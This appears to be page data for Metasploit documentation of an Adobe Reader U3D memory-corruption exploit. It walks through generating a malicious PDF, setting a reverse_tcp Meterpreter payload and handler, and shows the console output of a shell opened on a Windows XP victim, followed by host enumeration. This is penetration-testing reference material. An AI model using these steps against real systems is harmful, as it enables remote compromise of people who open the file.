{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/fileformat/adobe_reader_u3d","result":{"data":{"moduleMetadataJson":{"id":"e5036875-2eb2-5dcf-905f-189539c1529e","name":"Adobe Reader U3D Memory Corruption Vulnerability","fullname":"exploit/windows/fileformat/adobe_reader_u3d","description":"This module exploits a vulnerability in the U3D handling within\n        versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.\n        The vulnerability is due to the use of uninitialized memory.\n\n        Arbitrary code execution is achieved by embedding specially crafted U3D\n        data into a PDF document. A heap spray via JavaScript is used in order to\n        ensure that the memory used by the invalid pointer issue is controlled.","rank":200,"fields":{"detailsSlug":"/modules/details/exploit/windows/fileformat/adobe_reader_u3d","documentationSlug":"/modules/documentation/exploit/windows/fileformat/adobe_reader_u3d"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module exploits a vulnerability in the U3D handling within versions 9.x through 9.4.6 and 10 through to 10.1.1 of Adobe Reader.\nThe vulnerability is due to the use of uninitialized memory. Arbitrary code execution is achieved by embedding specially\ncrafted U3D data into a PDF document. A heap spray via JavaScript is used in order to ensure that the memory\nused by the invalid pointer issue is controlled.</p>\n<p>Link to vulnerable software <a href=\"http://www.oldversion.com/windows/download/acrobat-reader-9-4-0\">OldVersion</a></p>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Install application on the target machine</li>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use exploit/windows/fileformat/adobe_reader_u3d</code></li>\n<li>Do: <code class=\"language-text\">set payload [windows/meterpreter/reverse_tcp]</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Do: <code class=\"language-text\">use [exploit/multi/handler</code></li>\n<li>Do: <code class=\"language-text\">set LHOST [IP]</code></li>\n<li>Do: <code class=\"language-text\">exploit</code></li>\n<li>Do: Open PDF on target machine with vulnerable software</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>FILENAME</strong></p>\n<p>  The file name.</p>\n<p>  <strong>OBFUSCATE</strong></p>\n<p>  Enable JavaScript obfuscation</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"adobe-reader-940-on-windows-xp-51-build-2600-service-pack-3\" style=\"position:relative;\"><a href=\"#adobe-reader-940-on-windows-xp-51-build-2600-service-pack-3\" aria-label=\"adobe reader 940 on windows xp 51 build 2600 service pack 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Adobe Reader 9.4.0 on Windows XP (5.1 Build 2600, Service Pack 3)</h3>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use exploit/windows/fileformat/adobe_reader_u3d\nmsf exploit(windows/fileformat/adobe_reader_u3d) &gt; set FILENAME myFile.pdf\n  FILENAME =&gt; myFile.pdf\nmsf exploit(windows/fileformat/adobe_reader_u3d) &gt; set LHOST 192.168.1.3\n  LHOST =&gt; 192.168.1.3\nmsf exploit(windows/fileformat/adobe_reader_u3d) &gt; exploit\n\n  [*] Creating &#39;myFile.pdf&#39; file...\n  [+] myFile.pdf stored at /root/.msf4/local/myFile.pdf\nmsf exploit(windows/fileformat/adobe_reader_u3d) &gt; use exploit/multi/handler\nmsf exploit(multi/handler) &gt; set LHOST 192.168.1.3\n  LHOST =&gt; 192.168.1.3\nmsf5 exploit(multi/handler) &gt; exploit\n\n  [*] Started reverse TCP handler on 192.168.1.3:4444\n  [*] Sending stage (180291 bytes) to 192.168.1.5\n  [*] Meterpreter session 1 opened (192.168.1.3:4444 -&gt; 192.168.1.5:1103) at 2019-12-05 18:01:07 -0700\nmeterpreter &gt; sysinfo\n  Computer        : COMPUTER_1\n  OS              : Windows XP (5.1 Build 2600, Service Pack 3).\n  Architecture    : x86\n  System Language : en_US\n  Domain          : WORKGROUP\n  Logged On Users : 2\n  Meterpreter     : x86/windows\nmeterpreter &gt; getuid\n  Server username: COMPUTER_1\\USER\nmeterpreter &gt; run post/windows/gather/enum_applications\n\n  [*] Enumerating applications installed on COMPUTER_1\n\n  Installed Applications\n  ======================\n\n  Name                Version\n  ----                -------\n  Adobe Reader 9.4.0  9.4.0\n\n\n  [+] Results stored in: /root/.msf4/loot/20191205180436_default_192.168.1.5_host.application_540854.txt</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"e5036875-2eb2-5dcf-905f-189539c1529e"}}}